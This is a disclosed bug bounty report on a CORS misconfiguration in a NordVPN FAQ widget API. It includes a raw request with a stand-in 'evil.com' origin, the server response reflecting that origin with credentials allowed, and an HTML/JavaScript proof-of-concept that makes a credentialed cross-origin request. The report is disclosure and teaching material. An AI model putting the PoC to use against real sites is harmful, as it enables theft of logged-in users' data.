# Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information

## Report Details
- **Report ID**: 796557
- **URL**: https://hackerone.com/reports/796557
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-14T11:26:49.981Z
- **Disclosed**: 2020-02-21T11:28:27.817Z

## Reporter
- **Username**: hridoy-ahmed
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
Summary:

Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information.
Description:

An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

Platform(s) Affected: [website]

*.nordvpncom
Steps To Reproduce:
Proof Of Concept 1:
When you get login ucp.nordvpn.com then check burpsuite httphistory there you get this api endpoint.
Request:
GET /~nordvpn/api/widget/v1/faqs?format=json&widgetType=float&account=nordvpn&configId=1047377312&referer=https%3A%2F%2Fucp.nordvpn.com%2Flogin%2F HTTP/1.1
Host: nordvpn.nanorep.co
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ucp.nordvpn.com/login/
Origin: https://evil.com
Connection: close
Cookie: u=v2,EU1,1DB7B8D10F64D9D7; bc.visitor_token=6633999527576281088; 3E6DB64A=cv_4#t_ED5D8790E#v_2#lv_ED5D87681#a_ED5D85839#e_00000000

Response:
HTTP/1.1 200 Ok
Server: nanoRepServer
Date: Fri, 14 Feb 2020 11:19:39 GMT
Content-type: application/json;charset=utf-8
Content-Length: 1278
X-XSS-Protection: 1; mode=block
ETag: "8D7B13ADC1074A0Nordvpn_3E6DB64A_domain_3E6DB5A0_Float_"
Pragma: no-cache
Vary: Origin
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Expires: Thu, 09 Jan 2020 07:35:14 GMT
Connection: close
X-Content-Type-Options: nosniff

[{ "title": "", "behavior": 7, "data": [{ "id": 0, "data": [] }]}, { "title": "FAQ", "behavior": 7, "data": [{ "id": 0, "data": [{ "label": "Connecting from a country with internet restrictions","data": 69566,"objectId": "1047408742","count": 0,"percent": 7.44, "likes": 13281, "titleAndBodyHash": -41996297,"visibility":639},{ "label": "How to securely watch Netflix with NordVPN?","data": 26765,"objectId": "1047407532","count": 0,"percent": 2.86, "likes": 12456, "titleAndBodyHash": -489098654,"visibility":639},{ "label": "Installing and using NordVPN on Debian, Ubuntu, and Linux Mint","data": 26268,"objectId": "1325531132","count": 0,"percent": 2.81, "likes": 2150, "titleAndBodyHash": -403967674,"visibility":767},{ "label": "What is your money-back policy?","data": 24180,"objectId": "1047407702","count": 0,"percent": 2.59, "likes": 7983, "titleAndBodyHash": 1032988019,"visibility":639},{ "label": "Connecting from a country with internet restrictions","data": 24130,"objectId": "1161220812","count": 0,"percent": 2.58, "likes": 1482, "titleAndBodyHash": -1869781525,"visibility":639},{ "label": "Setting up a router with NordVPN","data": 20777,"objectId": "1047409322","count": 0,"percent": 2.22, "likes": 8849, "titleAndBodyHash": -257303784,"visibility":639}] }]}]


POC 2(save this as .html file and open you see my account details )

<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://nordvpn.nanorep.co/~nordvpn/api/widget/v1/faqs?format=json&widgetType=float&account=nordvpn&configId=1047377312&referer=https%3A%2F%2Fucp.nordvpn.com%2Flogin%2F", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>created by <a href="https://facebook.com/hridoyahmedhridu">@Hridoy</a></h3>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>

How to fix:

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

Reference:
https://hackerone.com/reports/426165
https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.

If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

## Attachments
- Kazam_screenshot_00024.png
